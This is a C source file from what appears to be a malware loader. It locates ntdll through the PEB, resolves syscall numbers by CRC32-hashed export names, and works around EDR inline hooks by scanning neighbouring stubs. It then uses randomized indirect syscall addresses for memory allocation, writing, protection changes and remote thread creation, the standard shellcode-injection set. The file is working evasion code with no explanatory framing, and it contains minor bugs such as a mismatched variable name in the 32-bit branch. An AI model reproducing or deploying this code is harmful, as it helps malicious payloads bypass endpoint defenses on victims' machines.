#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "Structs.h"
#include "Common.h"



#define CRC_POLYNOMIAL  0xEDB88324
#define DOWN			0x20
#define UP				-0x20
#define SYSCALLCOUNT	255


UINT32 CRC32B(LPCSTR cString)
{

	UINT32      uMask = 0x00,
		uHash = 0xFFFFFFFF;
	INT         i = 0x00;

	while (cString[i] != 0) {

		uHash = uHash ^ (UINT32)cString[i];

		for (int ii = 0; ii < 8; ii++) {

			uMask = -1 * (uHash & 1);
			uHash = (uHash >> 1) ^ (CRC_POLYNOMIAL & uMask);
		}

		i++;
	}

	return ~uHash;
}


DWORD GetRandomValue(IN DWORD min, IN DWORD max) {
	return (rand() & (max - min)) + min;
}



BOOL FetchNtdllConfig() {

#ifdef  _M_X64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
	PPEB PPEB = (PPEB)__readfsdword(0x30);
#endif

	PLDR_DATA_TABLE_ENTRY pLDR = (PPEB_LDR_DATA)((PBYTE)pPEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	if (pLDR->DllBase == NULL)
		return FALSE;

	PBYTE pPEBase = (PBYTE)pLDR->DllBase;

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pPEBase;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(pPEBase + pDosHdr->e_lfanew);
	if (pNtHdr->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY)(pPEBase + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Fill NTDLL_CONFIG structure
	pNtdllConfig->dwNumberOfNames = pExpDir->NumberOfNames;
	pNtdllConfig->pAddress = (PVOID)pPEBase;
	pNtdllConfig->pdwArrayOfAddresses = (PDWORD)(pPEBase + pExpDir->AddressOfFunctions);
	pNtdllConfig->pdwArrayOfNames = (PDWORD)(pPEBase + pExpDir->AddressOfNames);
	pNtdllConfig->pwArrayOfOrdinals = (PWORD)(pPEBase + pExpDir->AddressOfNameOrdinals);


	return TRUE;
}


BOOL FetchNtSyscall(IN OUT PNT_SYSCALL pNtSyscall) {

	srand((unsigned int)time(NULL));

	if (pNtSyscall->dwHash == NULL)
		return FALSE;

	PBYTE pCurrentFunctionAddr = NULL;
	PCHAR pCurrentFunctionName = NULL;

	for (DWORD i = 0; i < pNtdllConfig->dwNumberOfNames; i++) {

		pCurrentFunctionAddr = ((PBYTE)pNtdllConfig->pAddress + pNtdllConfig->pdwArrayOfAddresses[pNtdllConfig->pwArrayOfOrdinals[i]]);
		pCurrentFunctionName = ((PCHAR)pNtdllConfig->pAddress + pNtdllConfig->pdwArrayOfNames[i]);

		if (CRC32B(pCurrentFunctionName) == pNtSyscall->dwHash) {

			// If syscall is not hooked
			if (*pCurrentFunctionAddr == 0x4C
				&& *(pCurrentFunctionAddr + 1) == 0x8B
				&& *(pCurrentFunctionAddr + 2) == 0xD1
				&& *(pCurrentFunctionAddr + 3) == 0xB8
				&& *(pCurrentFunctionAddr + 6) == 0x00
				&& *(pCurrentFunctionAddr + 7) == 0x00) {

				BYTE high = *(pCurrentFunctionAddr + 5);
				BYTE low = *(pCurrentFunctionAddr + 4);

				pNtSyscall->dwSSN = (high << 8) | low;
				break;
			}

			// If syscall is hooked 
			if (*pCurrentFunctionAddr == 0xE9) {
				for (WORD idx = 1; idx <= SYSCALLCOUNT; idx++) {
					if (*(pCurrentFunctionAddr + idx * UP) == 0x4C
						&& *(pCurrentFunctionAddr + 1 + idx * UP) == 0x8B
						&& *(pCurrentFunctionAddr + 2 + idx * UP) == 0xD1
						&& *(pCurrentFunctionAddr + 3 + idx * UP) == 0xB8
						&& *(pCurrentFunctionAddr + 6 + idx * UP) == 0x00
						&& *(pCurrentFunctionAddr + 7 + idx * UP) == 0x00) {

						BYTE high = *(pCurrentFunctionAddr + 5 + idx * UP);
						BYTE low = *(pCurrentFunctionAddr + 4 + idx * UP);

						pNtSyscall->dwSSN = (high << 8) | low + idx;
						break;
					}

					if (*(pCurrentFunctionAddr + idx * DOWN) == 0x4C
						&& *(pCurrentFunctionAddr + 1 + idx * DOWN) == 0x8B
						&& *(pCurrentFunctionAddr + 2 + idx * DOWN) == 0xD1
						&& *(pCurrentFunctionAddr + 3 + idx * DOWN) == 0xB8
						&& *(pCurrentFunctionAddr + 6 + idx * DOWN) == 0x00
						&& *(pCurrentFunctionAddr + 7 + idx * DOWN) == 0x00) {

						BYTE high = *(pCurrentFunctionAddr + 5 + idx * DOWN);
						BYTE low = *(pCurrentFunctionAddr + 4 + idx * DOWN);

						pNtSyscall->dwSSN = (high << 8) | low - idx;
						break;
					}
				}
			}

			// If syscall is hooked through inline hook method
			if (*(pCurrentFunctionAddr + 3) == 0xE9) {
				for (WORD idx = 1; idx <= SYSCALLCOUNT; idx++) {
					if (*(pCurrentFunctionAddr + idx * UP) == 0x4C
						&& *(pCurrentFunctionAddr + 1 + idx * UP) == 0x8B
						&& *(pCurrentFunctionAddr + 2 + idx * UP) == 0xD1
						&& *(pCurrentFunctionAddr + 3 + idx * UP) == 0xB8
						&& *(pCurrentFunctionAddr + 6 + idx * UP) == 0x00
						&& *(pCurrentFunctionAddr + 7 + idx * UP) == 0x00) {

						BYTE high = *(pCurrentFunctionAddr + 5 + idx * UP);
						BYTE low = *(pCurrentFunctionAddr + 4 + idx * UP);

						pNtSyscall->dwSSN = (high << 8) | low + idx;
						break;
					}

					if (*(pCurrentFunctionAddr + idx * DOWN) == 0x4C
						&& *(pCurrentFunctionAddr + 1 + idx * DOWN) == 0x8B
						&& *(pCurrentFunctionAddr + 2 + idx * DOWN) == 0xD1
						&& *(pCurrentFunctionAddr + 3 + idx * DOWN) == 0xB8
						&& *(pCurrentFunctionAddr + 6 + idx * DOWN) == 0x00
						&& *(pCurrentFunctionAddr + 7 + idx * DOWN) == 0x00) {

						BYTE high = *(pCurrentFunctionAddr + 5 + idx * DOWN);
						BYTE low = *(pCurrentFunctionAddr + 4 + idx * DOWN);

						pNtSyscall->dwSSN = (high << 8) | low - idx;
						break;
					}
				}
			}

			break;
		}
		else
			continue;
	}


	if (pNtSyscall->dwSSN == 0x00 && pCurrentFunctionAddr == NULL)
		return FALSE;

	DWORD RANDOMRANGE = GetRandomValue(3, 10);
	PBYTE pRandumAddr = pCurrentFunctionAddr + 0x20 * RANDOMRANGE;

	for (DWORD i = 1; i <= 0x20; i++) {
		if (*(pRandumAddr + i) == 0x0F && *(pRandumAddr + i + 1) == 0x05) {
			pNtSyscall->pSyscallInstrAddr = pRandumAddr + i;
			break;
		}
	}


	return TRUE;
}


BOOL FetchNtApi() {

	if (!FetchNtdllConfig())
		return ERROR_FUNCTION_FAILED;


	pNtApi->NtAllocateVirtualMemory.dwHash = NTALLOCATEVIRTUALMEMORY;
	if (!FetchNtSyscall(&pNtApi->NtAllocateVirtualMemory))
		return FALSE;
#ifdef DEBUG
	printf("[+] NtAllocateVirtualMemory:\tSSN: 0x%0.2X | Random Syscall instr: 0x%p\n", pNtApi->NtAllocateVirtualMemory.dwSSN, 
		pNtApi->NtAllocateVirtualMemory.pSyscallInstrAddr);
#endif


	pNtApi->NtWriteVirtualMemory.dwHash = NTWRITEVIRTUALMEMORY;
	if (!FetchNtSyscall(&pNtApi->NtWriteVirtualMemory))
		return FALSE;
#ifdef DEBUG
	printf("[+] NtWriteVirtualMemory:\tSSN: 0x%0.2X | Random syscall instr: 0x%p\n", pNtApi->NtWriteVirtualMemory.dwSSN, 
		pNtApi->NtWriteVirtualMemory.pSyscallInstrAddr);
#endif


	pNtApi->NtProtectVirtualMemory.dwHash = NTPROTECTVIRTUALMEMORY;
	if (!FetchNtSyscall(&pNtApi->NtProtectVirtualMemory))
		return FALSE;
#ifdef DEBUG
	printf("[+] NtProtectVirtualMemory:\tSSN: 0x%0.2X | Random syscall instr: 0x%p\n", pNtApi->NtProtectVirtualMemory.dwSSN, 
		pNtApi->NtProtectVirtualMemory.pSyscallInstrAddr);
#endif


	pNtApi->NtCreateThreadEx.dwHash = NTCREATETHREADEX;
	if (!FetchNtSyscall(&pNtApi->NtCreateThreadEx))
		return FALSE;
#ifdef DEBUG
	printf("[+] NtCreateThreadEx:\t\tSSN: 0x%0.2X | Random syscall instr: 0x%p\n", pNtApi->NtCreateThreadEx.dwSSN, 
		pNtApi->NtCreateThreadEx.pSyscallInstrAddr);
#endif


	pNtApi->NtWaitForSingleObject.dwHash = NTWAITFORSINGLEOBJECT;
	if (!FetchNtSyscall(&pNtApi->NtWaitForSingleObject))
		return FALSE;
#ifdef DEBUG
	printf("[+] NtWaitForSingleObject:\tSSN: 0x%0.2X | Random syscall instr: 0x%p\n", pNtApi->NtWaitForSingleObject.dwSSN,
		pNtApi->NtWaitForSingleObject.pSyscallInstrAddr);
#endif
	


	return TRUE;
}